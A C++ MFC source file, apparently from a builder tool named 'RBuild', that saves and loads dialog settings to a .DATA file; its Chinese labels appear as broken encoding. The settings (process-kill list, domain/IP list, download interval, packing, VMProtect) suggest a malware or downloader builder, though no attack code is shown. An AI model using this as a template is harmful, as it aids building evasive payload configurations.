////////////////
/////QQ:200816000
/////˳�����¹�Ӱ
//////////////////
#include "stdafx.h"
#include "RBuild.h"
#include "RBuildDlg.h"

//---------- ���ļ���Ҫ������,�������ļ�����(����ʼ��)�� ȫ�ֱ��� ----------//

//---------- ���ļ���Ҫ������,�������ļ�����(��ʵ��)�� �ӳ��� --------------//
TCHAR*		FormatTimeToChar(TCHAR *szBuf, DWORD dwSize);
//--------------------------------------------------------------------------//

typedef	struct	__SAVEPARAME{
	DWORD	dwSize;
	WCHAR	szName[128];
	WCHAR	cData[1];
}SAVEPARAME, *PSAVEPARAME;

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
void CRBuildDlg::ReadParamFromMemory(char *pFileByte, DWORD dwFileSize, TCHAR *szMemberType, void *pObj, TCHAR *szName)
{
	SAVEPARAME	*pMove = NULL, *pSaveParam = NULL;


	pMove = (SAVEPARAME*)pFileByte;
	do{
		if(lstrcmpi(pMove->szName, szName) == 0)
		{
			pSaveParam = pMove;
			break;
		}
		pMove = (SAVEPARAME*)((char*)pMove + pMove->dwSize);
	}while((char*)pMove < pFileByte + dwFileSize);

	if(pSaveParam == NULL)
		return;

	if(lstrcmpi(szMemberType, L"CEdit") == 0)
	{
		((CEdit*)pObj)->SetWindowTextW( pSaveParam->cData );
	}else if(lstrcmpi(szMemberType, L"DWORD") == 0)
	{
		*(DWORD*)pObj = *(DWORD*)&pSaveParam->cData[0];
	}else if(lstrcmpi(szMemberType, L"CheckButton") == 0)
	{
		((CButton*)pObj)->SetCheck((int)pSaveParam->cData[0]);
	}

	UpdateData( FALSE );

	return;
}

void CRBuildDlg::WriteParamToFile(HANDLE hFile, TCHAR *szMemberType, void *pObj, TCHAR *szName)
{
	DWORD		dwSize = 0, dwByte = 0;
	SAVEPARAME	*pSaveParam = NULL;


	UpdateData( TRUE );

	if(lstrcmpi(szMemberType, L"CEdit") == 0)
	{
		int			iLen = 0;
		TCHAR		wBuffer[4096];

		memset(wBuffer, 0, sizeof(wBuffer));
		iLen = ((CEdit*)pObj)->GetWindowTextLengthW() + 1;
		((CEdit*)pObj)->GetWindowTextW(wBuffer, iLen);

		dwSize = (sizeof(SAVEPARAME) - 1) + (iLen * 2);
		pSaveParam = (SAVEPARAME*)new char[dwSize];
		memset(pSaveParam, 0, dwSize);

		lstrcpy(&pSaveParam->cData[0], wBuffer);

	}else if(lstrcmpi(szMemberType, L"DWORD") == 0)
	{
		dwSize = (sizeof(SAVEPARAME) - 1) + sizeof(DWORD);
		pSaveParam = (SAVEPARAME*)new char[dwSize];
		memset(pSaveParam, 0, dwSize);

		*(DWORD*)&pSaveParam->cData[0] = *(DWORD*)pObj;
	}else if(lstrcmpi(szMemberType, L"CheckButton") == 0)
	{
		dwSize = sizeof(SAVEPARAME);
		pSaveParam = (SAVEPARAME*)new char[dwSize];
		memset(pSaveParam, 0, dwSize);

		if( (((CButton*)pObj)->GetState() & 0x00000003) == TRUE )
			pSaveParam->cData[0] = '\x01';
	}

	if(pSaveParam != NULL)
	{
		pSaveParam->dwSize = dwSize;
		lstrcpy(pSaveParam->szName, szName);
		WriteFile(hFile, pSaveParam, pSaveParam->dwSize, &dwByte, NULL);
		delete pSaveParam;
	}

	return;
}

void CRBuildDlg::OnBnClickedButton2()	//��ȡ����
{
	char	*pFileByte = NULL;
	TCHAR	szFilePath[MAX_PATH], szFilters[] = L"DATA�ļ�(*.DATA)|*.DATA||";
	DWORD	dwByte = 0, dwFileSize = 0;
	HANDLE	hFile = INVALID_HANDLE_VALUE;


	::CFileDialog dlgsave(TRUE, NULL, L"*.DATA", OFN_HIDEREADONLY|OFN_PATHMUSTEXIST|OFN_FILEMUSTEXIST, szFilters, NULL, 0, 1);
	if(dlgsave.DoModal() == IDCANCEL)
	{
		goto __END;
	}
	else
	{
		CString	csFilePaht;
		
		csFilePaht = dlgsave.GetPathName();
		memset(szFilePath, 0, sizeof(szFilePath));
		lstrcpy(szFilePath, csFilePaht.GetBuffer());
	}

	hFile = CreateFile(szFilePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	dwFileSize = GetFileSize(hFile, NULL);
	pFileByte = new char[dwFileSize];
	ReadFile(hFile, pFileByte, dwFileSize, &dwByte, NULL);
	CloseHandle( hFile );

	//==============================================================================================================//
	ReadParamFromMemory(pFileByte, dwFileSize, L"DWORD", &m_Version, L"�汾��");
	ReadParamFromMemory(pFileByte, dwFileSize, L"CEdit", &m_KillProcess, L"ɱ�����б�");

	ReadParamFromMemory(pFileByte, dwFileSize, L"CEdit", &m_DNList, L"����/IP�б�");
	ReadParamFromMemory(pFileByte, dwFileSize, L"CEdit", &m_Item, L"�ļ��б�");
	ReadParamFromMemory(pFileByte, dwFileSize, L"CEdit", &m_Path, L"ͳһĿ¼");
	ReadParamFromMemory(pFileByte, dwFileSize, L"DWORD", &m_Port, L"ͳһ�˿�");
	ReadParamFromMemory(pFileByte, dwFileSize, L"DWORD", &m_Sleep, L"���ؼ��");

	ReadParamFromMemory(pFileByte, dwFileSize, L"CheckButton", &m_Pack, L"�ӿ�");
	ReadParamFromMemory(pFileByte, dwFileSize, L"CheckButton", &m_VMP, L"VMProtect");

	//==============================================================================================================//

	delete pFileByte;

	MessageBox(L"�����������", L"       Done       ", MB_OK);

__END:
	return;
}

void CRBuildDlg::OnBnClickedButton1()	//��������
{
	TCHAR	szFilePath[MAX_PATH], szTime[32], szFileName[64], szFilters[] = L"DATA�ļ�(*.DATA)|*.DATA||";
	DWORD	dwByte = 0;
	HANDLE	hFile = INVALID_HANDLE_VALUE;


	memset(szFileName, 0, sizeof(szFileName));
	wsprintf(szFileName, L"%s.DATA", FormatTimeToChar(szTime, sizeof(szTime)));
	::CFileDialog dlgsave(FALSE, NULL, szFileName, OFN_HIDEREADONLY, szFilters, NULL, 0, 1);
	if(dlgsave.DoModal() == IDCANCEL)
	{
		goto __END;
	}
	else
	{
		CString	csFilePaht;
		
		csFilePaht = dlgsave.GetPathName();
		memset(szFilePath, 0, sizeof(szFilePath));
		lstrcpy(szFilePath, csFilePaht.GetBuffer());
	}

	hFile = CreateFile(szFilePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	//==============================================================================================================//
	WriteParamToFile(hFile, L"DWORD", &m_Version, L"�汾��");
	WriteParamToFile(hFile, L"CEdit", &m_KillProcess, L"ɱ�����б�");

	WriteParamToFile(hFile, L"CEdit", &m_DNList, L"����/IP�б�");
	WriteParamToFile(hFile, L"CEdit", &m_Item, L"�ļ��б�");
	WriteParamToFile(hFile, L"CEdit", &m_Path, L"ͳһĿ¼");
	WriteParamToFile(hFile, L"DWORD", &m_Port, L"ͳһ�˿�");
	WriteParamToFile(hFile, L"DWORD", &m_Sleep, L"���ؼ��");

	WriteParamToFile(hFile, L"CheckButton", &m_Pack, L"�ӿ�");
	WriteParamToFile(hFile, L"CheckButton", &m_VMP, L"VMProtect");
	//==============================================================================================================//

	CloseHandle( hFile );

	MessageBox(L"�����������", L"       Done       ", MB_OK);

__END:
	return;
}